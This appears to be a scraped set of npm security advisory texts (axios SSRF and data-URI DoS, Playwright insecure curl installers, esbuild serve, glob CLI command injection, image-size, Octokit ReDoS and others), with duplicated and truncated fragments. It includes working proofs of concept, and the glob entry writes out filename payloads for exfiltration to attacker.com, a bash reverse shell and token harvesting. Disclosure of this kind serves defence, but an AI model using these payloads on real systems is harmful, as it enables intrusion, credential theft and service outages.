Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",

      "details": "### Summary\nUse of `curl` with the `-k` (or `--insecure`) flag in installer scripts allows attackers to deliver arbitrary executables via Man-in-the-Middle (MitM) attacks. This can lead to full system compromise, as the downloaded files are installed as privileged applications.\n\n### Details\nThe following scripts in the `microsoft/playwright` repository at commit [`bee11cbc28f24bd18e726163d0b9b1571b4f26a8`](https://github.com/microsoft/playwright/commit/bee11cbc28f24bd18e726163d0b9b1571b4f26a8) use `curl -k` to fetch and install executable packages without verifying the authenticity of the SSL certificate:\n\n\n- [`packages/playwright-core/bin/reinstall_chrome_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_chrome_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_stable_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_dev_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_dev_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_stable_mac.sh)\n\nIn each case, the shell scripts download a browser installer package using `curl -k` and immediately install it:\n\n```shell\ncurl --retry 3 -o ./<pkg-file> -k <url>\nsudo installer -pkg /tmp/<pkg-file> -target /\n```\n\nDisabling SSL verification (`-k`) means the download can be intercepted and replaced with malicious content.\n\n### PoC\nA high-level exploitation scenario:\n\n1. An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)",

      "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ?

No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body.

If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",

No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body.

If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",

The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",

      "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
      "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",

Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

      "details": "### Summary\n\n`image-size` is vulnerable to a Denial of Service vulnerability when processing specially crafted images.\n\nThe issue occurs because of an infine loop in `findBox` when processing certain images with a box with size `0`.\n\n\n### Details\n\nIf the first bytes of the input does not match any bytes in `firstBytes`, then the package tries to validate the image using other handlers:\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31\nexport function detector(input: Uint8Array): imageType | undefined {\n  const byte = input[0]\n  if (byte in firstBytes) {\n    const type = firstBytes[byte]\n    if (type && typeHandlers[type].validate(input)) {\n      return type\n    }\n  }\n\n  const finder = (key: imageType) => typeHandlers[key].validate(input) //<--\n  return keys.find(finder)\n}\n```\n\nSome handlers that call `findBox` to validate or calculate the image size are `jxl`, `heif` and `jp2`.\n\n`JXL` handler calls `findBox` inside `validate`. To reach the `findBox` call, the value at position `4:8` should be `'JXL '`\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60\nexport const JXL: IImage = {\n  validate: (input: Uint8Array): boolean => {\n    const boxType = toUTF8String(input, 4, 8)\n    if (boxType !== 'JXL ') return false      //<---\n\n    const ftypBox = findBox(input, 'ftyp', 0) //<---\n    if (!ftypBox) return false\n\n    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)\n    return brand === 'jxl '\n  },\n```\n\n`findBox` can lead to an infinite loop because the value of `box.size` is `0`, thus the `offset` variable is not updated. Below relevant code with comments (using one of the `PAYLOAD` below as example):\n```js\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37\nexport const readUInt32BE = (input: Uint8Array, offset = 0) =>\n  input[offset] * 2 ** 24 +     // 0 +\n  input[offset + 1] * 2 ** 16 + // 0 +\n  input[offset + 2] * 2 ** 8 +  // 0 +\n  input[offset + 3]             // 0\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75\nfunction readBox(input: Uint8Array, offset: number) {   // offset: 0\n  if (input.length - offset < 4) return\n  const boxSize = readUInt32BE(input, offset)           // 0\n  if (input.length - offset < boxSize) return           // (8 - 0) < 0 => false\n  return {\n    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '\n    offset,                                             // 0\n    size: boxSize,                                      // 0\n  }\n}\n\n// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84\nexport function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0\n  while (offset < input.length) {         // 0 < 8 => false\n    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }\n    if (!box) break                       // false\n    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' => false\n    offset += box.size                    // offset += 0\n  }\n}\n\n```\n\nA similar issue occurs for `HEIF` and `JP2` handlers:\n- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts\n- https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts\n\n\n### PoC\n\nUsage:\n```bash\nnode main.js poc1|poc2\n```\n\n- poc for `image-size@2.0.1`\n```js\n// mkdir 2.0.1\n// cd 2.0.1/\n// npm i image-size@2.0.1\nconst {imageSizeFromFile} = require(\"image-size/fromFile\");\nconst {imageSize} = require(\"image-size\");\n\nconst fs = require('fs');\n\n// JXL\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x4A, 0x58, 0x4C, 0x20, // \"JXL \"\n]);\n\n// HEIF\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n//   0x61, 0x76, 0x69, 0x66  // \"avif\"\n// ]);\n\n// JP2\n// const PAYLOAD = new Uint8Array([\n//   0x00, 0x00, 0x00, 0x00, // Box with size 0\n//   0x6A, 0x50, 0x20, 0x20, // \"jP  \"\n// ]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() { \n  (async () => {\n    await imageSizeFromFile(FILENAME)\n    console.log('Done') // never executed\n  })();\n}\n\nfunction poc2() {\n  imageSize(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1);

Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",

      "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",

The relevant code is as follows:\n```js\nurl = ((normalizedResponse.headers.link || \"\").match(\n  /<([^>]+)>;\\s*rel=\"next\"/,\n) || [])[1];\n```\nThe regular expression `/<([^>]+)>;\\s*rel=\"next\"/` may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted `Link` headers.\n\n### PoC\n[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/d3f2ad000be8384d2105c87c2ed7ce7d)\n1. run npm i @octokit/plugin-paginate-rest\n2. run 'node poc.js'\nresult:\n3. then the program will stuck forever with high CPU usage\n```js\nimport { Octokit } from \"@octokit/core\";\nimport { paginateRest } from \"@octokit/plugin-paginate-rest\";\n\nconst MyOctokit = Octokit.plugin(paginateRest);\nconst octokit = new MyOctokit({\n  auth: \"your-github-token\",\n});\n\n// Intercept the request to inject a malicious 'link' header for ReDoS\noctokit.hook.wrap(\"request\", async (request, options) => {\n  const maliciousLinkHeader = \"\" + \"<\".repeat(100000) + \">\"; // attack string\n  return {\n    data: [],\n    headers: {\n      link: maliciousLinkHeader, // Inject malicious 'link' header\n    },\n  };\n});\n\n// Trigger the ReDoS attack by paginating through GitHub issues\n(async () => {\n  try {\n    for await (const normalizedResponse of octokit.paginate.iterator(\n      \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n    )) {\n      console.log({ normalizedResponse });\n    }\n  } catch (error) {\n    console.error(\"Error encountered:\", error);\n  }\n})();\n```\n![image](https://github.com/user-attachments/assets/619c030e-5473-4a26-9e2a-4b9a26c1563b)\n\n### Impact\n#### What kind of vulnerability is it?\nThis is a *Regular Expression Denial of Service (ReDoS) vulnerability*, which occurs due to excessive backtracking in the regex pattern:\n```js\n/<([^>]+)>;\\s*rel=\"next\"/\n```\nWhen processing a specially crafted `Link` header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.\n#### Who is impacted?\n* Users of `@octokit/plugin-paginate-rest` who call `octokit.paginate.iterator()` and process untrusted or manipulated `Link` headers.\n* Applications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.\n* GitHub API consumers who integrate this package into their projects for paginated data retrieval.",

      "details": "### Summary\nThe regular expression `/<([^>]+)>; rel=\"deprecation\"/` used to match the `link` header in HTTP responses is vulnerable to a ReDoS (Regular Expression Denial of Service) attack. This vulnerability arises due to the unbounded nature of the regex's matching behavior, which can lead to catastrophic backtracking when processing specially crafted input. An attacker could exploit this flaw by sending a malicious `link` header, resulting in excessive CPU usage and potentially causing the server to become unresponsive, impacting service availability.\n### Details\nThe vulnerability resides in the regular expression `/<([^>]+)>; rel=\"deprecation\"/`, which is used to match the `link` header in HTTP responses. This regular expression captures content between angle brackets (`<>`) followed by `; rel=\"deprecation\"`. However, the pattern is vulnerable to ReDoS (Regular Expression Denial of Service) attacks due to its susceptibility to catastrophic backtracking when processing malicious input.\nAn attacker can exploit this vulnerability by sending a specially crafted `link` header designed to trigger excessive backtracking. For example, the following headers:\n```js\nfakeHeaders.set(\"link\", \"<\".repeat(100000) + \">\");\nfakeHeaders.set(\"deprecation\", \"true\");\n```\nThe crafted `link` header consists of 100,000 consecutive `<` characters followed by a closing `>`. This input forces the regular expression engine to backtrack extensively in an attempt to match the pattern. As a result, the server can experience a significant increase in CPU usage, which may lead to denial of service, making the server unresponsive or even causing it to crash under load.\nThe issue is present in the following code:\n```js\nconst matches = responseHeaders.link && responseHeaders.link.match(/<([^>]+)>; rel=\"deprecation\"/);\n```\nIn this scenario, the `link` header value triggers the regex to perform excessive backtracking, resulting in resource exhaustion and potentially causing the service to become unavailable.\n\n### PoC\n[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/2afdabf0fc4cb6cfbd3b1d58b6082f6a)\n1. run npm i @octokit/request\n2. run 'node poc.js'\nresult:\n3. then the program will stuck forever with high CPU usage\n```js\nimport { request } from \"@octokit/request\";\nconst originalFetch = globalThis.fetch;\nglobalThis.fetch = async (url, options) => {\n  const response = await originalFetch(url, options);\n  const fakeHeaders = new Headers(response.headers);\n  fakeHeaders.set(\"link\", \"<\".repeat(100000) + \">\");\n  fakeHeaders.set(\"deprecation\", \"true\");\n  return new Response(response.body, {\n    status: response.status,\n    statusText: response.statusText,\n    headers: fakeHeaders\n  });\n};\nrequest(\"GET /repos/octocat/hello-world\")\n  .then(response => {\n    // console.log(\"[+] Response received:\", response);\n  })\n  .catch(error => {\n    // console.error(\"[-] Error:\", error);\n  });\n// globalThis.fetch = originalFetch;\n```\n### Impact\nThis is a *Denial of Service (DoS) vulnerability* caused by a *ReDoS (Regular Expression Denial of Service)* flaw. The vulnerability allows an attacker to craft a malicious `link` header that exploits the inefficient backtracking behavior of the regular expression used in the code.\nThe primary impact is the potential for *server resource exhaustion*, specifically high CPU usage, which can cause the server to become unresponsive or even crash when processing the malicious request. This affects the availability of the service, leading to downtime or degraded performance.\nThe vulnerability impacts any system that uses this specific regular expression to process `link` headers in HTTP responses. This can include:\n* Web applications or APIs that rely on parsing headers for deprecation information.\n* Users interacting with the affected service, as they may experience delays or outages if the server becomes overwhelmed.\n* Service providers who may face disruption in operations or performance degradation due to this flaw.\nIf left unpatched, the vulnerability can be exploited by any unauthenticated user who is able to send a specially crafted HTTP request with a malicious `link` header, making it a low-barrier attack that could be exploited by anyone.",

By sending an authorization header containing an excessively long sequence of spaces followed by a newline and \"@\", an attacker can exploit inefficient regular expression processing, leading to excessive resource consumption. This can significantly degrade server performance or cause a denial-of-service (DoS) condition, impacting availability.\n### Details\nThe issue occurs at [line 52](https://github.com/octokit/request-error.js/blob/main/src/index.ts) of iterator.ts in the @octokit/request-error repository.\nThe vulnerability is caused by the use of an inefficient regular expression in the handling of the `authorization` header within the request processing logic:\n```js\nauthorization: options.request.headers.authorization.replace(\n  / .*$/, \n  \" [REDACTED]\"\n)\n```\nThe regular expression `/ .*$/` matches a space followed by any number of characters until the end of the line. This pattern is vulnerable to Regular Expression Denial of Service (ReDoS) when processing specially crafted input. Specifically, an attacker can send an `authorization` header containing a long sequence of spaces followed by a newline and \"@\", such as:\n```js\nheaders: {\n  authorization: \"\" + \" \".repeat(100000) + \"\\n@\",\n}\n```\nDue to the way JavaScript's regular expression engine backtracks while attempting to match the space followed by arbitrary characters, this input can cause excessive CPU usage, significantly slowing down or even freezing the server. This leads to a denial-of-service condition, impacting availability.\n### PoC\n[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/e1203ad22701fd043b8501eb37676a0d)\n1. run npm i @octokit/request-error\n2. run 'node poc.js'\nresult:\n3. then the program will stuck forever with high CPU usage\n```js\nimport { RequestError } from \"@octokit/request-error\";\n\nconst error = new RequestError(\"Oops\", 500, {\n  request: {\n    method: \"POST\",\n    url: \"https://api.github.com/foo\",\n    body: {\n      bar: \"baz\",\n    },\n    headers: {\n      authorization: \"\"+\" \".repeat(100000)+\"\\n@\",\n    },\n  },\n  response: {\n    status: 500,\n    url: \"https://api.github.com/foo\",\n    headers: {\n      \"x-github-request-id\": \"1:2:3:4\",\n    },\n    data: {\n      foo: \"bar\",\n    },\n  },\n});\n```\n\n### Impact\n#### Vulnerability Type & Impact:\nThis is a `Regular Expression Denial of Service (ReDoS) vulnerability`, which occurs due to an inefficient regular expression (`/ .*$/`) used to sanitize the `authorization` header. An attacker can craft a malicious input that triggers excessive backtracking in the regex engine, leading to high CPU consumption and potential denial-of-service (DoS).\n#### Who is Impacted?\n* Projects or services using this code to process HTTP headers are vulnerable.\n* Applications that rely on user-supplied `authorization` headers are at risk, especially those processing a large volume of authentication requests.\n* Multi-tenant or API-driven platforms could experience degraded 